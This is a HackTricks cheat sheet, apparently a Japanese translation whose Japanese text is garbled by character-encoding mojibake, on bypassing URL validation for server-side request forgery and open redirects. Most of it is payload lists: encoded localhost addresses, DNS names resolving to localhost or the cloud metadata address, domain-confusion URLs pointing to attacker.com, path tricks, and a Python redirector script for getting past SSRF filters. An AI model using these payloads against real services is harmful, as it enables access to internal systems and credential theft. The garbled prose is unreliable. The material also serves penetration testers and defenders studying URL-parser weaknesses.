# URL Format Bypass

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

### Localhost
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://â‘ â‘¡â‘¦.â“ª.â“ª.â“ª

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127ã€‚0ã€‚0ã€‚1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (776).png>)

**Burpæ‹¡å¼µæ©Ÿèƒ½** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) ã¯ã€IPãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆãƒã‚¤ãƒ‘ã‚¹ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚

### ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ‘ãƒ¼ã‚µãƒ¼
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attackerã€‚com
â’¶â“‰â“‰â’¶â’¸â“€â’ºâ“¡.â’¸â“â“œ
```

```
â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾
â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’—
â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’°
â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰
â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢
â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿
```
### ãƒ‰ãƒ¡ã‚¤ãƒ³ã®æ··ä¹±
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### ãƒ‘ã‚¹ã¨æ‹¡å¼µå­ã®ãƒã‚¤ãƒ‘ã‚¹

URLãŒãƒ‘ã‚¹ã¾ãŸã¯æ‹¡å¼µå­ã§çµ‚ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€ã¾ãŸã¯ãƒ‘ã‚¹ã‚’å«ã‚€å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒã‚¤ãƒ‘ã‚¹ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ï¼š
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

ãƒ„ãƒ¼ãƒ« [**recollapse**](https://github.com/0xacb/recollapse) ã¯ã€ä¸ãˆã‚‰ã‚ŒãŸå…¥åŠ›ã‹ã‚‰ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç”Ÿæˆã—ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹æ­£è¦è¡¨ç¾ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿**](https://0xacb.com/2022/11/21/recollapse/) ã‚‚ç¢ºèªã—ã¦ãã ã•ã„ã€‚

### Automatic Custom Wordlists

ãƒãƒ¼ãƒˆã‚¹ã‚¦ã‚£ã‚¬ãƒ¼ã® [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚ã“ã“ã§ã¯ã€è¨±å¯ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã¨æ”»æ’ƒè€…ã®ãƒ›ã‚¹ãƒˆã‚’å…¥åŠ›ã™ã‚‹ã¨ã€è©¦ã™ãŸã‚ã®URLãƒªã‚¹ãƒˆãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚ã¾ãŸã€URLã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€Hostãƒ˜ãƒƒãƒ€ãƒ¼ã€ã¾ãŸã¯CORSãƒ˜ãƒƒãƒ€ãƒ¼ã§ä½¿ç”¨ã§ãã‚‹ã‹ã©ã†ã‹ã‚‚è€ƒæ…®ã•ã‚Œã¾ã™ã€‚

### Bypass via redirect

ã‚µãƒ¼ãƒãƒ¼ãŒSSRFã®**å…ƒã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¦ã„ã‚‹**ãŒã€ãã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã™ã‚‹**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¦ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ä¾‹ãˆã°ã€`url=https://www.google.com/` ã‚’ä»‹ã—ã¦SSRFã«è„†å¼±ãªã‚µãƒ¼ãƒãƒ¼ã¯ã€**urlãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¦ã„ã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã—ã‹ã—ã€ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ãŸã„å ´æ‰€ã«302ã§å¿œç­”ã™ã‚‹[pythonã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹](https://pastebin.com/raw/ywAUhFrv)ã¨ã€127.0.0.1ã®ã‚ˆã†ãª**ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã•ã‚ŒãŸIPã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚„ã€gopherã®ã‚ˆã†ãªãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã•ã‚ŒãŸ**ãƒ—ãƒ­ãƒˆã‚³ãƒ«**ã«**ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
[ã“ã®ãƒ¬ãƒãƒ¼ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## èª¬æ˜ã•ã‚ŒãŸãƒˆãƒªãƒƒã‚¯

### ãƒãƒƒã‚¯ã‚¹ãƒ©ã‚¹ãƒˆãƒªãƒƒã‚¯

_ãƒãƒƒã‚¯ã‚¹ãƒ©ã‚¹ãƒˆãƒªãƒƒã‚¯_ ã¯ã€[WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) ã¨ [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B) ã®é•ã„ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚RFC3986ã¯URIã®ä¸€èˆ¬çš„ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ãŒã€WHATWGã¯ã‚¦ã‚§ãƒ–URLã«ç‰¹åŒ–ã—ã¦ãŠã‚Šã€ç¾ä»£ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«æ¡ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚é‡è¦ãªé•ã„ã¯ã€WHATWGæ¨™æº–ãŒãƒãƒƒã‚¯ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ï¼ˆ`\`ï¼‰ã‚’ãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ï¼ˆ`/`ï¼‰ã¨åŒç­‰ã¨èªè­˜ã—ã¦ã„ã‚‹ç‚¹ã§ã€ã“ã‚ŒãŒURLã®è§£ææ–¹æ³•ã«å½±éŸ¿ã‚’ä¸ãˆã€ç‰¹ã«ãƒ›ã‚¹ãƒˆåã‹ã‚‰ãƒ‘ã‚¹ã¸ã®é·ç§»ã‚’ç¤ºã—ã¾ã™ã€‚

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### ãã®ä»–ã®æ··ä¹±

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../.gitbook/assets/image (600).png>)

ç”»åƒå‡ºå…¸: [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

## å‚è€ƒæ–‡çŒ®

* [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
